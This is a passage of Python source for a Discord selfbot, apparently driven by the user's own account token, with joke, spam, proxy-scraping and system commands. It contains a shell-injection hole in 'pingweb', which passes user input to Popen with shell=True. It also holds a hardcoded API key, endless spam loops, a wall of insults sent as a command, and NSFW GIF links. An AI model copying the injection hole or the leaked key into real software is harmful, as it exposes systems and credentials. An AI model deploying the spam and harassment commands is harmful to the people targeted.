            "`(\°-°)\                               ┬─┬`",
        )
        self.cmdused(ctx)
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

    @commands.command()
    async def warning(self, ctx):
        if await disableCmd(ctx) == 0: return
        list = (
            "`LOAD !! WARNING !! SYSTEM OVER`",
            "`OAD !! WARNING !! SYSTEM OVERL`",
            "`AD !! WARNING !! SYSTEM OVERLO`",
            "`D !! WARNING !! SYSTEM OVERLOA`",
            "`! WARNING !! SYSTEM OVERLOAD !`",
            "`WARNING !! SYSTEM OVERLOAD !!`",
            "`ARNING !! SYSTEM OVERLOAD !! W`",
            "`RNING !! SYSTEM OVERLOAD !! WA`",
            "`NING !! SYSTEM OVERLOAD !! WAR`",
            "`ING !! SYSTEM OVERLOAD !! WARN`",
            "`NG !! SYSTEM OVERLOAD !! WARNI`",
            "`G !! SYSTEM OVERLOAD !! WARNIN`",
            "`!! SYSTEM OVERLOAD !! WARNING`",
            "`! SYSTEM OVERLOAD !! WARNING !`",
            "`SYSTEM OVERLOAD !! WARNING !!`",
            "`IMMINENT SHUT-DOWN IN 0.5 SEC!`",
            "`WARNING !! SYSTEM OVERLOAD !!`",
            "`IMMINENT SHUT-DOWN IN 0.2 SEC!`",
            "`SYSTEM OVERLOAD !! WARNING !!`",
            "`IMMINENT SHUT-DOWN IN 0.01 SEC!`",
            "`SHUT-DOWN EXIT ERROR ¯\\(｡･益･)/¯`",
            "`CTRL + R FOR MANUAL OVERRIDE..`",
        )
        cmdused("warning")
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)

class FunCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(aliases=['yt', 'vid', 'video', 'ytlookup'])
    async def youtube(self, ctx, *, search):
        if await disableCmd(ctx) == 0: return
        """Search for videos on YouTube"""
        search = search.replace(' ', '+').lower()
        response = requests.get(f"https://www.youtube.com/results?search_query={search}").text
        result = bs4(response, "lxml")
        dir_address = f"{result.find_all(attrs={'class': 'yt-uix-tile-link'})[0].get('href')}"
        output=f"**Top Result:**\nhttps://www.youtube.com{dir_address}"
        try:
            await ctx.send(output)
            await ctx.message.delete()
        except discord.Forbidden:
            pass
        cmdused("ytlookup")

    @commands.command(pass_context=True)
    async def spoiler(self, ctx, *, msg: str):
        if await disableCmd(ctx) == 0: return
        """Spoiler tag. Ex: [p]spoiler Some book | They get married."""
        try:
            if " | " in msg:
                spoiled_work, spoiler = msg.lower().split(" | ", 1)
            else:
                spoiled_work = msg
                spoiler = msg
            await ctx.message.edit(content='Spoiler for `' + spoiled_work + '`: \n`' + ''.join(
                map(lambda c: chr(ord('a') + (((ord(c) - ord('a')) + 13) % 26)) if c >= 'a' and c <= 'z' else c, spoiler)) + '`\n' + self.bot.bot_prefix + 'Use http://rot13.com to decode')
        except:
            await ctx.send('\\❌ Could not encrypt spoiler.')
        cmdused("spoiler")

    @commands.command(aliases=['urbandict', 'urbandictionary', 'urban-dictionary', 'urban-dict'])
    async def urban(self, ctx, *, message):
        if await disableCmd(ctx) == 0: return
        """Looks up shit on urban dictionary
        Note: ~~Only works with single words not sentences~~
        This is now fixed but you have to use "multi%20word%20search"
        instead of just multi word senctence i know a little gay but it works
        """
        term = urllib3.parse.quote(message)
        termu = message
        url = "https://www.urbandictionary.com/define.php?term="
        url += "+" + term
        try:
            html = urllib.request.urlopen(url)
            soup = bs4(html, "html.parser")
            definition = soup.find(class_="meaning").get_text()
            embed = discord.Embed(
                title="🔍" + termu, description=definition, color=0x0062F4
            )
            embed.set_footer(text=footer)
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/809818922911137794/812143511591714846/Urban-Dictionary.png")
            await ctx.send(embed=embed)
            await ctx.message.delete()
        except:
            msg = "**Error:** Phrase doesn't exist in the dictionary surprisingly."
            await ctx.send(msg)
            await ctx.message.delete()

    @commands.command()
    async def quote(self, ctx):
        if await disableCmd(ctx) == 0: return
        try:
            res = requests.get("https://zenquotes.io/api/random")
            res = json.loads(res.text)
            res = res[0]["q"]
            await ctx.send(f"{res}")
            await ctx.message.delete()
        except Exception as e:
            print(e)
            await ctx.message.delete()
        cmdused("quote")

    @commands.command()
    async def countdown(self, ctx, m: int = 15, *, n = "-embed"):
        if await disableCmd(ctx) == 0: return
        if m == 0:
            await ctx.message.delete()
            print(errorcol+"Invalid arguments.")
            return
        else:
            if n.startswith("-embed"):
                nachricht = await ctx.send("", embed=discord.Embed(
                    description=f"**Countdown:** {m}", color=emcolor))
                cmdused("countdown")
                await ctx.message.delete()
                while m != 1:
                    m -= 1
                    sleep(1.15)
                    await nachricht.edit(content="", embed=discord.Embed(
                    description=f"**Countdown:** {m}", color=emcolor))
                sleep(1.15)
                await nachricht.edit(content="", embed=discord.Embed(
                description=f"**Countdown Finished**", color=emcolor))
                sleep(delinterval)
                await nachricht.delete()
            else:
                nachricht = await ctx.send(f"**Countdown:** {m}")
                cmdused("countdown")
                await ctx.message.delete()
                while m != 1:
                    m -= 1
                    sleep(1.15)
                    await nachricht.edit(f"**Countdown:** {m}")
                sleep(1.15)
                await nachricht.edit(f"**Countdown: Finished**")

    @countdown.error
    async def count_er(self, ctx, error):
        if isinstance(error, commands.BadArgument):
            await ctx.message.delete()
            print(errorcol+"Invalid arguments.")

    @commands.command(aliases=['changehypesquad'])
    async def hypesquad(self, ctx, house):  
        await ctx.message.delete()
        request = requests.Session()
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
        }
        global payload_
        if house == "bravery":
            payload_ = {'house_id': 1}
        elif house == "brilliance":
            payload_ = {'house_id': 2}
        elif house == "balance":
            payload_ = {'house_id': 3}
        elif house == "random":
            houses = [1, 2, 3]
            payload_ = {'house_id': random.choice(houses)}
        try:
            request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload_, timeout=10)
            await ctx.send("Success!\nChanged hypesquad to `{a}`.".format(a=house), delete_after=delinterval)
        except Exception as e:
            print(s.space+s.red+f"Error: {e}")
        cmdused('hypesquad')

    @commands.command(name='get-color', aliases=['color', 'colour', 'sc', 'getcolor'])
    async def _get_color(self, ctx, *, color: discord.Colour):  
        await ctx.message.delete()
        file = io.BytesIO()
        Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
        file.seek(0)
        em = discord.Embed(color=color, title=f'Showing Color: {str(color)}')
        em.set_image(url='attachment://color.png')
        await ctx.send(file=discord.File(file, 'color.png'), embed=em, delete_after=delinterval)
        cmdused('getcolor')

    @commands.command(aliases=['rainbow-role', 'rainboworole'])
    @commands.guild_only()
    async def rainbow(self, ctx, *, role: discord.Role):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        cmdused('rainbow-role')
        while True:
            try:
                await role.edit(role=role, colour=RandomColor())
                await asyncio.sleep(10)
            except discord.Forbidden:
                print(s.space+s.red+"No permissions to use rainbow-role")
                break
            except discord.HTTPException:
                print(s.space+s.red+"Unable to change colors of the role (HTTPException)")
                break
            except:
                print(s.space+s.red+"Unable to change colors of the role (Unknown)")
                break

    @rainbow.error
    async def rainbow_r(self, ctx, error):
        if isinstance(error, commands.BadArgument):
            print(errorcol+"Role not found.")

    @commands.command(name='auto-bump', aliases=['bump', 'autobump'])
    async def _auto_bump(self, ctx, channel: discord.TextChannel):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        count = 0
        cmdused('auto-bump')
        while True:
            try:
                count += 1
                await channel.send('!d bump')           
                print(s.space+f'{Fore.GREEN}{c.b}[AUTO-BUMP]{Style.RESET_ALL} {count} bumps sent.'+Fore.RESET)
                await asyncio.sleep(random.randint(7200, 7260))
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

    @commands.command()
    async def tts(self, ctx, *, message): 
        await ctx.message.delete()
        buff = await do_tts(message)
        await ctx.send(file=discord.File(buff, f"_.wav"))
        cmdused('tts')

    @commands.command()
    async def passwordgen(self, ctx, *, length: int):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        letters = "ABCDEFGHIJKLMNOPQRSTUVXYZabcdefghijklmnopqrstuvxyz1234567890!@#$%^&*[]:;"
        passw = ''.join(random.choice(letters) for i in range(length))
        await ctx.send("Password Gen: ||`{}`||".format(passw), delete_after=15)
        cmdused("passwordgen")

    @commands.command(aliases=['dadjoke'])
    async def joke(self, ctx):  
        await ctx.message.delete()
        headers = {
            'Content-Type': 'application/json', 
            'Accept': 'application/json', 
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36'
        }
        async with aiohttp.ClientSession()as session:
            async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
                r = await req.json()
        await ctx.send(r["joke"])
        cmdused('dadjoke')

    @commands.command(aliases=['slots', 'bet', 'slotmachine'])
    async def slot(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
        a = random.choice(emojis)
        b = random.choice(emojis)
        c = random.choice(emojis)
        slotmachine = f"**[ {a} {b} {c} ]**\n{ctx.author.name},"
        if (a == b == c):
            await ctx.send(f"**Slot Machine!**\n\n{slotmachine} All matchings, you won!", delete_after=delinterval)
        elif (a == b) or (a == c) or (b == c):
            await ctx.send(f"**Slot Machine!**\n\n{slotmachine} 2 in a row, you won!", delete_after=delinterval)
        else:
            await ctx.send(f"**Slot Machine!**\n\n{slotmachine} No match, you lost", delete_after=delinterval)
        cmdused('slotmachine')

    @commands.command()
    async def minesweeper(self, ctx, size: int = 5):  
        await ctx.message.delete()
        m_numbers = [
            ":one:",
            ":two:", 
            ":three:", 
            ":four:", 
            ":five:", 
            ":six:"
        ]
        m_offets = [
            (-1, -1),
            (0, -1),
            (1, -1),
            (-1, 0),
            (1, 0),
            (-1, 1),
            (0, 1),
            (1, 1)
        ]
        size = max(min(size, 8), 2)
        bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
        is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
        has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
        message = "**Click to play**:\n"
        for y in range(size):
            for x in range(size):
                tile = "||{}||".format(chr(11036))
                if has_bomb(x, y):
                    tile = "||{}||".format(chr(128163))
                else:
                    count = 0
                    for xmod, ymod in m_offets:
                        if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                            count += 1
                    if count != 0:
                        tile = "||{}||".format(m_numbers[count - 1])
                message += tile
            message += "\n"
        await ctx.send(message)

    @commands.command(aliases=['ytcomment'])
    async def youtubecomment(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        a = args.split(' ')
        b = '+'.join(a)
        c = ctx.author.avatar_url_as(format='jpg')
        e = ctx.author.name.split(' ')
        d = '+'.join(e)
        #Image.open(BytesIO(await f'https://some-random-api.ml/canvas/youtube-comment?username={d}&avatar={c}&comment={b}'.read())).save(f'{ctx.message.id}.png')
        embed=discord.Embed(
            title=f'{ctx.author.name} Commented!',
            color=emcolor)
        embed.set_footer(text=footer)
        embed.set_image(url=f'https://some-random-api.ml/canvas/youtube-comment?username={d}&avatar={c}&comment={b}')
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('ytcomment')

    @commands.command()
    async def findip(self, ctx, member):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
        await ctx.send(f'{member}\'s IP is `{ip}`')
        cmdused('findip')

    @commands.command()
    async def eyerape(self, ctx, amount: int = 8):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        for i in range(amount):
            i = i
            await ctx.send('https://media.discordapp.net/attachments/780975963101200465/784264624366551080/763838189256835103.gif')
            await asyncio.sleep(0.25)
        cmdused('eyerape')

    @commands.command()
    async def choice(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        a = args.split('|')
        embed=discord.Embed(
            title='Random Choice',
            description=f'Picked:\n{random.choice(a)}',
            color=emcolor
        )
        embed.set_footer(text=footer)
        await ctx.message.delete()
        i = await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('choice')

    @commands.command(aliases=['unfunny'])
    async def notfunny(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()

        par1 = "Not funny, didn't laugh. Your joke is so bad I would have preferred the joke went over my head and you gave up re-telling me the"" joke. To be honest this is a horrid attempt at trying to get a laugh out of me. Not a chuckle, not a hehe, not even a subtle burst of ""air out of my esophagus. Science says before you laugh your brain preps your face muscles but I didn't even feel the slightest twitch. ""0/10 this joke is so bad I cannot believe anyone legally allowed you to be creative at all. The amount of brainpower you must have put ""into that joke has the potential to power every house on Earth. Get a personality and learn how to make jokes, read a book. I'm not ""saying this to be funny I genuinely mean it on how this is just bottom barrel embarrassment at comedy. You've single-handedly killed ""humor and every comedic act on the planet. I'm so disappointed that society has failed as a whole in being able to teach you how to be funny."
        par2 = "Honestly if I put in all my power and time to try and make your joke funny it would require Einstein himself to build a device to strap me into so I can be connected to the energy of a billion stars to do it, and even then all that joke would get from people is a subtle scuff. Youre lucky I still have the slightest of empathy for you after telling that joke otherwise I would have committed every war crime in the book just to prevent you from attempting any humor ever again. We should put that joke in text books so future generations can be wary of becoming such an absolute comedic failure. Im disappointed, hurt, and outright offended that my precious time has been wasted in my brain understanding that joke. In the time that took I was planning on helping kids who have been orphaned, but because of that youve wasted my time explaining the obscene integrity of your terrible attempt at comedy. Now those kids are suffering without meals and theres nobody to blame but you. I hope youre happy with what you have done and I truly hope you can move on and learn from this piss poor attempt."
        par3 = "What you just actually posted basically has absolutely 0 sense of cohesion or comedy in a subtle way. It's for all intents and purposes such a horrid attempt at communication I specifically am surprised you particularly are even able to basically exist in society, or so they for all intents and purposes thought. If it literally was a joke, it may really have been the for all intents and purposes worse joke i ever heard in my life, since it lacks any qualities actually your really normal joke would particularly have in a subtle way. If it particularly was supposed to for all intents and purposes be a particularly normal sentence, then it definitely fails as that too, as what you just really said literally makes absolutely no sense, which definitely shows that it's pretty such a horrid attempt at communication I actually am surprised you basically are even able to actually exist in society in a subtle way. It's so dumb, a cave man would really be able to really speak definitely more cleverly and for all intents and purposes more nuanced than you in a kind of big way. I for the most part am so ashamed of having to specifically see this, it's just sad, demonstrating how if it for all intents and purposes was supposed to generally be a really normal sentence, then it actually fails as that too, as what you just generally said for the most part makes absolutely no sense, which really shows that it's for all intents and purposes such a horrid attempt at communication I literally am surprised you mostly are even able to particularly exist in society in a for all intents and purposes big way."
        par4 = "Your lack of brain cells doesn't definitely help you either, but if you generally wanna really try and mostly talk with me you mostly gotta kind of speak normally you idiotic piece of shit, particularly further showing how if it basically was a joke, it may particularly have been the much worse joke i ever heard in my life, since it lacks any qualities actually your basically normal joke would basically have, very contrary to popular belief. I honestly essentially think they should particularly put you in the mental hospital, but not for improving particularly your brain, but rather mostly keep you out of society so no one definitely has to kind of deal with particularly your crap, demonstrating how i kind of am so ashamed of having to actually see this, it's just sad, demonstrating how if it literally was supposed to specifically be a definitely normal sentence, then it specifically fails as that too, as what you just really said mostly makes absolutely no sense, which kind of shows that it's really such a horrid attempt at communication I kind of am surprised you particularly are even able to for the most part exist in society, for all intents and purposes contrary to popular belief. Your stupidity will kind of be essentially remembered forever as a very prime example of why humanity kind of is on a downwards spiral, generally further showing how it's generally such a horrid attempt at communication I for all intents and purposes am surprised you essentially are even able to literally exist in society, sort of contrary to popular belief"

        await ctx.send(par1)
        await asyncio.sleep(0.2)
        await ctx.send(par2)
        await asyncio.sleep(0.2)
        await ctx.send(par3)
        await asyncio.sleep(0.2)
        await ctx.send(par4)
        cmdused('unfunny')

    @commands.command(aliases=['8ball'])
    async def eightball(self, ctx, *, question):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        answers = [
            'Possibly.',
            'Ask Again Later...',
            'Try Again.',
            'It\'s Certain.',
            'Most Likely No',
            'Most Likely Yes',
            'No.',
            'Yes.',
            'Definetly a Yes.',
            'Definetly a No.',
            'What did you expected?',
            'Cannot answer now, try again.',
            "It is certain",
            "It is decidedly so",
            "Without a doubt",
            "Yes, definitely",
            "You may rely on it",
            "As I see it, yes",
            "Most likely",
            "Outlook good",
            "Yes",
            "Signs point to yes",
            "Reply hazy try again",
            "Ask again later",
            "Better not tell you now",
            "Cannot predict now",
            "Concentrate and ask again",
            "Don't count on it",
            "My reply is no",
            "My sources say no",
            "Outlook not so good",
            "Very doubtful"
        ]

        embed = discord.Embed(
            title='8ball',
            description=f"\n\nQuestion Asked:\n_{question}_\n\nAnswer:\n*{random.choice(answers)}*",
            colour=emcolor
        )
        embed.set_footer(text=footer)
        await ctx.send(embed=embed, delete_after=delinterval)
        cmdused('8ball')

    @commands.command()
    async def randomgif(self, ctx):
        if await disableCmd(ctx) == 0: return
        gifs = ['https://tenor.com/view/dog-doggie-funny-cute-puppy-gif-15926582',
        'https://tenor.com/view/pizza-snooki-ilove-you-pizza-ily-gif-11904013',
        'https://tenor.com/view/teletubbies-gif-19240924',
        'https://tenor.com/view/nervous-sign-of-the-cross-praying-hoping-nico-santos-gif-10946409',
        'https://tenor.com/view/aww-cute-gif-11008488',
        'https://tenor.com/view/yes-baby-goal-funny-face-gif-13347383',
        'https://tenor.com/view/jon-stewart-eat-eating-munch-munching-gif-4883511',
        'https://tenor.com/view/patrick-star-lovely-im-in-love-love-nice-gif-8795789',
        'https://tenor.com/view/calm-yo-tits-calm-down-calm-relax-terry-crews-gif-4655399',
        'https://tenor.com/view/mc-carthy-the-heat-oh-my-god-i-am-balls-deep-in-boredom-gif-15467960',
        'https://tenor.com/view/depressed-bored-boredom-swing-head-gif-17224602',
        'https://tenor.com/view/squirt-porn-porno-masturbation-gif-11954365',
        'https://tenor.com/view/ted-teddy-bear-theres-so-much-porn-shocked-surprised-gif-4233104',
        'https://tenor.com/view/dog-hug-bff-best-friend-friend-gif-9512793',
        'https://tenor.com/view/jonah-hill-yay-african-child-screaming-shouting-gif-7212866',
        'https://tenor.com/view/sad-baby-frown-cry-tantrums-gif-4649018',
        'https://tenor.com/view/oh-yeah-cute-dance-gif-13942687']

        await ctx.message.delete()
        await ctx.send(random.choice(gifs))

    @commands.command()
    async def gifsearch(self, ctx, query=None):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if query is None:
            r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
            res = r.json()
            await ctx.send(res['data']['url'])

        else:
            r = requests.get(
                f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
            res = r.json()
            await ctx.send(res['data'][0]["url"])
        cmdused('gifsearch')

    @commands.command(aliases=['randscreenshot', 'randomss', 'randomscreenshot'])
    async def randomsc(self, ctx):
        if await disableCmd(ctx) == 0: return
        def codes():
            codeLength = 6
            letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
            return ''.join(random.choice(letters) for i in range(codeLength))
        await ctx.message.delete()
        await ctx.send("https://prnt.sc/"+codes())
        cmdused('randomsc')

    @commands.command(aliases=["searchimg", "searchimage", "imagesearch", "imgsearch"])
    async def _image(self, ctx, *, args):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        url = 'https://unsplash.com/search/photos/' + args.replace(" ", "%20")
        page = requests.get(url)
        soup = bs4(page.text, 'html.parser')
        image_tags = soup.findAll('img')
        if str(image_tags[2]['src']).find("https://trkn.us/pixel/imp/c="):
            link = image_tags[2]['src']
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file_:
                    await ctx.send(f"Search result for: **{args}**", file=discord.File(file_, f"r.png"))
            except:
                await ctx.send(f'' + link + f"\nSearch result for: **{args}** ")
        else:
            await ctx.send("Nothing found for **" + args + "**", delete_after=delinterval)
        cmdused('imgsearch')

class ErrorEvents(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.Cog.listener()
    async def on_command_error(self, ctx, error):
        del_ = (config["Config"]["DeleteNotFound"] == True)
        
        if isinstance(error, commands.CommandNotFound):
            if del_:
                try:
                    await ctx.message.delete()
                except:
                    pass
            c = ctx.message.content.split(' ')[0].replace(prefix, "")
            print(errorcol + f"Command not found: {c}")
            return

        elif isinstance(error, commands.MissingRequiredArgument):
            if del_:
                try:
                    await ctx.message.delete()
                except:
                    pass
            print(errorcol + f"Missing Required Arguments!")
            return

        elif isinstance(error, commands.MissingPermissions):
            if del_:
                try:
                    await ctx.message.delete()
                except:
                    pass
            print(errorcol + f"Missing Permissions. ({error.missing_perms})")
            return
            
        elif isinstance(error, commands.CommandOnCooldown):
            if del_:
                try:
                    await ctx.message.delete()
                except:
                    pass
            print(errorcol + f"CommandOnCooldown: Retry in {error.retry_after}.")
            return

        elif isinstance(error, commands.NoPrivateMessage):
            if del_:
                try:
                    await ctx.message.delete()
                except:
                    pass
            c = ctx.message.content.split(' ')[0].replace(prefix, "")
            print(" "*2+errorcol+f"\"{c}\" cannot be used in Direct Messages.")
            return
        else:
            pass

class Tools(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def tinyurl(self, ctx, *, link: str):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        if not link.startswith("http"):
            _htp = "https://"
            link = _htp + link
        else: pass
        url = 'http://tinyurl.com/api-create.php?url=' + link
        async with ctx.session.get(url) as resp:
            new = await resp.text()
        emb = discord.Embed(colour=emcolor)
        emb.add_field(name="Original Link", value=link, inline=False)
        emb.add_field(name="Shortened Link", value=new, inline=False)
        await ctx.send(embed=emb, delete_after=delinterval)
        cmdused("tinyurl")

    @commands.command()
    async def sysinfo(self, ctx):
        if await disableCmd(ctx) == 0: return
        """Gives you client system info"""
        start = pytime.perf_counter()
        message = await ctx.send("Ping...")
        end = pytime.perf_counter()
        duration = (end - start) * 1000
        await ctx.message.delete()
        await message.delete()
        cpuavg = psutil.cpu_percent(interval=None)
        mem = psutil.virtual_memory()[2]
        durround = round(duration, 3)
        embed = discord.Embed(
            title="System information", 
            description="", 
            color=emcolor, 
            timestamp=datetime.utcnow())\
            .set_thumbnail(url="https://i.imgur.com/GuRAHY1.png")\
            .add_field(name="CPU", value=f"{cpuavg}%", inline=True)\
            .add_field(name="Ram", value=f"{mem}%", inline=True)\
            .add_field(name="Latency", value=f"{durround}ms", inline=True)\
            .add_field(name="OS", value=f"{sys.platform}", inline=True)\
            .set_footer(text=footer)
        await ctx.send(embed=embed)

    @commands.command(aliases=['clearcmd', 'consoleclear'])
    async def cls(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        os.system('cls')
        print('\n\n')
        spac = " "*35
        if compat == False:
            color_l1 = "\033[38;5;75m" 
            color_l2 = "\033[38;5;68m" 
            color_l3 = "\033[38;5;62m" 
            color_l4 = "\033[38;5;61m" 
            color_l5 = "\033[38;5;60m" 
            color_l6 = "\033[38;5;62m"
        else:
            color_l1 = lightbluecol
            color_l2 = lightbluecol
            color_l3 = lightbluecol
            color_l4 = lightbluecol
            color_l5 = lightbluecol
            color_l6 = lightbluecol
        print(Style.BRIGHT+spac+Fore.WHITE + "██████" + color_l1 + "╗ " + Fore.WHITE + "███████" + color_l1 + "╗ " + Fore.WHITE + "█████" + color_l1 + "╗ " + Fore.WHITE + "██████" + color_l1 + "╗ " + Fore.WHITE + "███████" + color_l1 + "╗" + Fore.WHITE + "██████" + color_l1 + "╗"+Fore.RESET)
        print(spac+Fore.WHITE + "██" + color_l2 + "╔══" + Fore.WHITE + "██" + color_l2 + "╗" + Fore.WHITE + "██" + color_l2 + "╔════╝" + Fore.WHITE + "██" + color_l2 + "╔══" + Fore.WHITE + "██" + color_l2 + "╗" + Fore.WHITE + "██" + color_l2 + "╔══" + Fore.WHITE + "██" + color_l2 + "╗" + Fore.WHITE + "██" + color_l2 + "╔════╝" + Fore.WHITE + "██" + color_l2 + "╔══" + Fore.WHITE + "██" + color_l2 + "╗"+Fore.RESET)
        print(spac+Fore.WHITE +  "██████" + color_l3 + "╔╝" + Fore.WHITE + "█████" + color_l3 + "╗  " + Fore.WHITE + "███████" + color_l3 + "║" + Fore.WHITE + "██████" + color_l3 + "╔╝" + Fore.WHITE + "█████" + color_l3 + "╗  " + Fore.WHITE + "██████" + color_l3 + "╔╝"+Fore.RESET)
        print(Style.RESET_ALL + spac+Fore.WHITE + "██" + color_l4 + "╔══" + Fore.WHITE + "██" + color_l4 + "╗" + Fore.WHITE + "██" + color_l4 + "╔══╝  " + Fore.WHITE + "██" + color_l4 + "╔══" + Fore.WHITE + "██" + color_l4 + "║" + Fore.WHITE + "██" + color_l4 + "╔═══╝ " + Fore.WHITE + "██" + color_l4 + "╔══╝  " + Fore.WHITE + "██" + color_l4 + "╔══" + Fore.WHITE + "██" + color_l4 + "╗"+Fore.RESET)
        print(Style.RESET_ALL+spac+Fore.WHITE + "██" + color_l5 + "║  " + Fore.WHITE + "██" + color_l5 + "║" + Fore.WHITE + "███████" + color_l5 + "╗" + Fore.WHITE + "██" + color_l5 + "║  " + Fore.WHITE + "██" + color_l5 + "║" + Fore.WHITE + "██" + color_l5 + "║     " + Fore.WHITE + "███████" + color_l5 + "╗" + Fore.WHITE + "██" + color_l5 + "║  " + Fore.WHITE + "██" + color_l5 + "║"+Fore.RESET)
        print(spac+color_l6+"╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝\n"+Fore.RESET)
        sys.stdout.write(' '*0 +  Fore.WHITE + Style.BRIGHT + '\033[4m ' + Fore.WHITE + Style.BRIGHT + '\033[4m '*51 + "      " + Fore.WHITE + Style.RESET_ALL + "\033[4m      " + '\033[4m '*51 + Fore.WHITE + ' '+Style.RESET_ALL)

    @commands.command(aliases=['proxy'])
    async def proxies(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        file = open("Data/Http-proxies.txt", "a+")
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)
        for p in proxies:
            file.write((p)+"\n")
        file = open("Data/Https-proxies.txt", "a+")
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)
        for p in proxies:
            file.write((p)+"\n")
        file = open("Data/Socks4-proxies.txt", "a+")
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)
        for p in proxies:
            file.write((p)+"\n")
        file = open("Data/Socks5-proxies.txt", "a+")
        res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
        proxies = []
        for proxy in res.text.split('\n'):
            proxy = proxy.strip()
            if proxy:
                proxies.append(proxy)
        for p in proxies:
            file.write((p)+"\n")
        cmdused('proxies')

    @commands.command()
    async def myip(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        def getip():
            ip = "None"
            try:
                ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
            except:
                pass
            return ip
        await ctx.send(f"Your IP is `{getip()}`", delete_after=15)
        cmdused("myip")

    @commands.command()
    async def shutdown(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        m = await ctx.send(f'Are you sure to shutdown your computer?\nIf yes, type `yes`')
        try:

            def checkdata(message): return message.author == ctx.message.author
            msg = await self.bot.wait_for('message', check=checkdata, timeout=15)
            msc = lambda m: (msg.content == m)
            if msc("yes") or msc("y"):

                await m.delete()
                os.system("start chrome https://www.youtube.com/watch?v=dQw4w9WgXcQ")
                sleep(5)
                os.system('shutdown /s /t 0')

            else:
                await m.delete()
                await ctx.send("\\❌ Destroy server cancelled.", delete_after=4)
                return

        except asyncio.TimeoutError:
            await ctx.send("\\❌ **Error**: Took too long to answer.", delete_after=4)
            await m.delete()
            return
        cmdused('shutdown')

    @commands.command()
    async def ping(self, ctx):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        await ctx.send(embed=discord.Embed(title="Pong! 🏓", description=f"Your ping is `{round(reaper.latency * 1000)}ms`", color=emcolor, timestamp=datetime.utcnow()).set_footer(text=footer), delete_after=delinterval)
        cmdused('ping')

    @commands.command()
    async def pingweb(self, ctx, http):
        if await disableCmd(ctx) == 0: return
        await ctx.message.delete()
        def pingSite(http: str):
            p = Popen(f"ping {http} -l 25000 -n 1", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            l2 = (p.stdout.read() + p.stderr.read()).decode().split("\n")[2]
            timeout = (l2 == "Request timed out.")
            if timeout:
                return ""
            else:
                ip = str(l2.split(':')[0])[10:]
                delay = str(l2.split(' ')[4])[5:]
                ttl = str(l2.split(' ')[5])[4:]
                return f"\nIP: `{ip}`\nPing: {delay}\nTTL: {ttl}"
        try:
            r = requests.get(http).status_code
            if r == 404:
                await ctx.send(f'Site is down, responded with a status code of `{r}`', delete_after=delinterval)
            else:
